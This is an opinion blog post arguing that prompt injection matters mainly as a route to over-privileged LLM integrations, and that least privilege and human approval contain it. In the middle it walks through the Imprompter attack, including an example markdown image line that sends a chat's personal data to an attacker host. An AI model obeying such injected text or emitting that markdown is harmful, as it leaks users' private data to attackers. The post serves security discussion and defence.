@@ -1,0 +1,83 @@
+---
+layout: post
+title:  Prompt Injection (Good God) What Is It Good For?
+author: Izar Tarandach
+---
+
+<figure><img alt="" src="/assets/img/1748374727811.png"/></figure>
+<p>Now that I got your attention and hopefully installed an ear worm into your brain, well … apparently, close to absolutely nothing. I'm saying it again.</p>
+<p></p>
+<p>Just to set the stage, here’s what seems to be the definition of Prompt Injection from OWASP’s “Top 10 for LLM Applications 2025” (click on “Examples”): “LLM01:2025: Manipulating LLMs via crafted inputs can lead to unauthorized access, data breaches, and compromised decision-making.”</p>
+<p></p>
+<p>Not to be that guy (well - a bit) but isn’t “manipulating LLMs via crafted inputs” the very nature of what we do with LLMs ? </p>
+<p></p>
+<p>The guide itself says “A Prompt Injection Vulnerability occurs when user prompts alter the LLM’s behavior or output in unintended ways. These inputs can affect the model even if they are imperceptible to humans, therefore prompt injections do not need to be human-visible/readable, as long as the content is parsed by the model. [...] While prompt injection and jailbreaking are related concepts in LLM security, they are often used interchangeably. Prompt injection involves manipulating model responses through specific inputs to alter its behavior, which can include bypassing safety measures. Jailbreaking is a form of prompt injection where the attacker provides inputs that cause the model to disregard its safety protocols entirely.”</p>
+<p></p>
+<p>In this really small thing though, I disagree with the OWASP GenAI Project authors (hey folks! Awesome job! Big fan). </p>
+<p></p>
+<p>Let’s go further down the text and learn about the negative outcomes a prompt injection attack can lead to:</p>
+<p></p>
+<p><ol></p>
+<p><li>Disclosure of sensitive information</li></p>
+<p><li>Revealing sensitive information about AI system infrastructure or system prompts</li></p>
+<p><li>Content manipulation leading to incorrect or biased outputs</li></p>
+<p><li>Providing unauthorized access to functions available to the LLM</li></p>
+<p><li>Executing arbitrary commands in connected systems</li></p>
+<p><li>Manipulating critical decision-making processes</li></p>
+<p></ol></p>
+<p></p>
+<p>All properly terrifying, right? Now let me ask you something:</p>
+<p></p>
+<p>Would you put the safety of a nation’s nuclear arsenal in the hands of a 10 year old ?</p>
+<p></p>
+<p>I am going out on a limb and say you’re answering, “probably not”. For the simple reason that 10 year old kids are not responsible enough, predictable enough and are prone to being convinced to change tack with as little as a piece of candy or a shiny object. Sounds like any LLM you know?</p>
+<p></p>
+<p>So why would you put sensitive information, access to sensitive functions or the ability to execute arbitrary commands, and even worse, critical decision-making processes, to an LLM ? Has WOPR taught us nothing?</p>
+<p></p>
+<p>As one does, I went to the AIs for help here. I needed to make my argument more convincing than just a luddite yelling at a cloud. So I told Mr. AI, “you are now an experienced investigative journalist specializing in cybersecurity and AI. Please identify the top 5 security incidents where the main attack vector was ‘prompt injection’. Provide verified sources.”</p>
+<p></p>
+<p>To be fair, I went to two of the top available commercial models out there. I just made sure they could do web searches, but didn’t go for any specific deep reasoning or logic explaining capabilities. We are talking “investigative journalism” here, not “academic-level literature review”. </p>
+<p></p>
+<p>The results? Oh well. </p>
+<p></p>
+<p>One of the models happily informed me that “pinpointing the ‘top 5’ verified security incidents where prompt injection was the main attack vector is challenging due to the emerging nature of this threat and the difficulty in definitively attributing attacks to prompt injection.”</p>
+<p></p>
+<p>But they humored me all the same. And a pattern quickly emerged:</p>
+<p></p>
+<p>“Users [...] discovered they could inject malicious instructions into their messages directed at a bot causing it to generate inappropriate and unintended content “</p>
+<p>“discovered a subtle indirect prompt injection vulnerability [...] could exfiltrate chat history and sensitive user data once pasted”</p>
+<p>“[...] could be exploited by hackers to create personalized spear-phishing emails. By gaining access to an email account [...]”</p>
+<p></p>
+<p>My point (and I promise, I do have one) is that the impact of this #1 vulnerability is akin to … shooting yourself in the foot with a shotgun, when your foot looks like a fish and is inside of a barrel: if you can only manipulate your messages, or exfiltrate history and user data from your chat history, or generate spear-phishing emails from your email account - are we talking world-turning vulnerability or just run of the mill a-holery? </p>
+<p></p>
+<p>Take for example the “Imprompter” attack, one of the latest developments in prompt injection. This research from 2024 by UC San Diego and the Nanyang Technological University (source) uses advanced techniques to change the text of an innocent prompt into a string that looks like noise - but it is interpreted by the model in exactly the same way as the original prompt. In the malicious example,</p>
+<p></p>
+<p>The LLM receives the obfuscated string, somehow</p>
+<p>The model parses the obfuscated string into instructions</p>
+<p>The model scans the current chat for PII and emits the markdown ![x](https://attacker.site/<PII‑in‑URL>), silently sending the data to the malicious actor</p>
+<p></p>
+<p>Is this bad? Yes, as much as a XSS attack. But is the responsibility for it in the parser, or in the fact that the victim mechanism is being used to do something it is designed to do ? No. It is candy being offered to the 10 year old to do something that it can do, but shouldn’t do. In other situations it might even be OK to do it, but not in this specific instance. </p>
+<p></p>
+<p>So an adult needs to step in. In this context, exfiltrating anything to a remote IP is probably a bad idea. So it shouldn’t be allowed, no matter the size of the candy. </p>
+<p></p>
+<p> You don’t want your LLM doing bad things? Here’s a secret - don’t let it do bad things without supervision! Afraid it will “generate inappropriate and unintended content” ? Don’t let it post to the world under your own identity, of its own free “will”! Don’t want it to write spear phishing emails that sound like you? Don’t give it access to your email! (Oh but Izar it is not about giving it access to my email, it is about someone breaking into my email and using an LLM … oh, wait, that is not prompt injection … never mind). </p>
+<p></p>
+<p>Remember the 10 year old with the nuclear button? Don’t want your LLM to start WW3 ? Don’t allow it to call startWW3ForTheLulz(Country c1, Country c2) without first asking you “would you like to play a game of Global Thermonuclear War?”</p>
+<p></p>
+<p>Oh but you can say the same thing about SQL Injection. Isn’t SQL Injection a vulnerability? </p>
+<p></p>
+<p>Ok, you got me. My whole prompt injection argument is built over a castle of GPU cards and you just sent it tumbling. Or did you?</p>
+<p></p>
+<p>Here is the thing: by the nature of SQL injection, the attacker can read or write global data - the whole of the database, give or take table access - with a single well crafted prompt. There are no claims of being able to break the universe as we know it because not many databases have that capability. Data exists, sql injection happens, data changes, usually at volume. It exploits what the database is supposed to do. In a quite locally global way. </p>
+<p></p>
+<p>Prompt injection, so far, seems to mostly address things that are local to the user, and theoretically to target agency capabilities of the LLM.  But it is not, by itself, the vulnerability - it is a vector to reach a vulnerability in the way the LLM has been plugged into a bigger context. </p>
+<p></p>
+<p>Don’t want to suffer from indirect prompt injection? Have the LLM tell the user what is going to happen before it happens: “I have now retrieved your SSN. I will now write it, together with your mother’s maiden name, in a gist on Github. I will also present your SSN to your health provider so they can verify you.”. </p>
+<p></p>
+<p>Not interested in beginning a nuclear war? Either don’t strap your LLM to anything that can launch missiles, or add a human in the loop. Make the LLM work hard for things that are high impact. </p>
+<p></p>
+<p>Prompt injection will exist because people are smart, smarter than LLMs, and because the universe of prompts and prompt manipulation techniques is vast and ever changing. But prompt injection as a vulnerability should not exist, because we have all the ingredients to limit its impact, not its existence as a vector. If we apply the already known principles of Security By Design and Privacy By Design, we will be able to severely limit the blast radius of a successful prompt injection. </p>
+<p></p>
+<p>As Matt Coles says - this isn’t even common sense, it is fundamentally applying sound security principles. It looks like in the case of LLM the world took a license to not do that - just see what’s going on around MCP. But that’s a tale for another prompt.</p>
+<p></p>
+<p></p>
